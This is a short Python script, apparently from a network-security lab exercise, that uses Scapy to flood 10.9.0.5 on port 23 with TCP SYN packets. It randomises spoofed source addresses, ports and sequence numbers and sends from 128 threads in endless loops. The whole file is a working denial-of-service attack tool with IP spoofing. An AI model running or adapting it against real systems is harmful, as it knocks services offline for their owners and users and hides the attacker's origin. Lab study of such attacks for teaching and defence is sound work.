#!/bin/env python3

from scapy.all import IP, TCP, send
from ipaddress import IPv4Address
from random import getrandbits
import threading

def synflood(i):
    print(f'Thread {i} started')
    ip = IP(dst="10.9.0.5")
    tcp = TCP(dport=23, flags='S')   # TO BE COMPLETED
    pkt = ip/tcp

    while True:
        pkt[IP].src = str(IPv4Address(getrandbits(32)))  # source iP
        pkt[TCP].sport = getrandbits(16)                 # source port
        pkt[TCP].seq = getrandbits(32)                   # sequence number
        send(pkt, verbose = 0)

def main():
    threads = []
    num_threads = 128
    for i in range(num_threads):
        thread = threading.Thread(target=synflood, args=(i,))
        threads.append(thread)
        thread.start()

    # Wait for all threads to complete
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()